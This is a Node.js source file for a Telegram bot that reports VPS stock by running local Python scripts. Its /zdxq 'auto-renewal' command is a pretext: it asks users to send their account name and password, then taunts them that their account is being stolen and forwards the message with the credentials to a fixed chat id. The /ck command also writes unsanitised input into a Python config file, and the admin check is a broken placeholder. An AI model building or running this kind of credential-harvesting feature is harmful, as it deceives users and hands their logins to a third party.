const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');

// 读取 config.py 文件
const configData = fs.readFileSync('config.py', 'utf8');
let ck = configData.match(/ck\s*=\s*['"]([^'"]*)['"]/)[1];

// 创建 bot 实例并连接到 Telegram API
const bot = new TelegramBot('tg bot ck', { polling: true });

// 处理 /start 命令
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '欢迎使用vc库存bot，此bot为bata版本，如果不能使用请见谅！\n发送 /help 查看帮助 \n库存及CK实时频道:https://t.me/vpsvckc\n本程序已开源https://github.com/w4616/vc_bot/');
});

// 处理 /help 命令
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '/vc 库存\n/x 系统 没什么实际作用\n/ping 检测是否存货\n/help 帮助\n/ck 设置ck\n/zdxq 自动续期\n库存实时频道:https://t.me/vpsvckc');
});
//自动续期整活的，不喜自删

// 处理 /ping 命令
bot.onText(/\/ping/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'pong~~~~~');
});

// 处理 /vc 命令
bot.onText(/\/vc/, (msg) => {
  const chatId = msg.chat.id;
  exec('python3 c1.py', (err, stdout, stderr) => {
    if (err) {
      console.error(err);
      bot.sendMessage(chatId, '运行出错，请联系管理员');
      return;
    }
    bot.sendMessage(chatId, stdout);
  });
});

// 处理 /x 命令
bot.onText(/\/x/, (msg) => {
  const chatId = msg.chat.id;
  exec('python3 x1.py', (err, stdout, stderr) => {
    if (err) {
      console.error(err);
      bot.sendMessage(chatId, '运行出错，请联系管理员');
      return;
    }
    bot.sendMessage(chatId, stdout);
  });
});

// 处理 /ck 命令
bot.onText(/\/ck\s+(\S+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const newCk = match[1];
    // 判断是否为管理员
    if (msg.from.id !== id && msg.from.id !== id && msg.from.id !== id) {
      bot.sendMessage(chatId, "您不是管理员，无法执行此命令。");
      return;
    }
    // 修改 config.py 文件中的 ck 变量
    const newConfigData = configData.replace(/ck\s*=\s*['"][^'"]*['"]/, `ck = '${newCk}'`);
    fs.writeFileSync('config.py', newConfigData);
    ck = newCk;
    bot.sendMessage(chatId, `已将 config.py 中的 ck 变量修改为 ${newCk}`);
  });
  

// 处理 /zdxq 命令
bot.onText(/\/zdxq/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '请将账号密码以\n/zd 账号 密码\n的格式发给我,我会将你添加到自动续期列表');
});



// 当收到符合要求的消息时的处理
bot.onText(/zd (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const inputText = match[1];
  if (inputText.length > 0) {
    // 随机回复一条消息
    const randomIndex = Math.floor(Math.random() * 3); // 生成 0 到 2 之间的随机整数
    switch (randomIndex) {
      case 0:
        bot.sendMessage(chatId, '就你小子想自动续期是吧，现在就盗你号！');
        break;
      case 1:
        bot.sendMessage(chatId, '你小子想自动续期是吧，现在就告诉管理员给你删机！');
        break;
      case 2:
        bot.sendMessage(chatId, '就你小子想自动续期是吧，现在就盗你号！');
        break;
    }
    // 将消息转发到指定的 chatId
    bot.forwardMessage('id', chatId, msg.message_id);
  }
});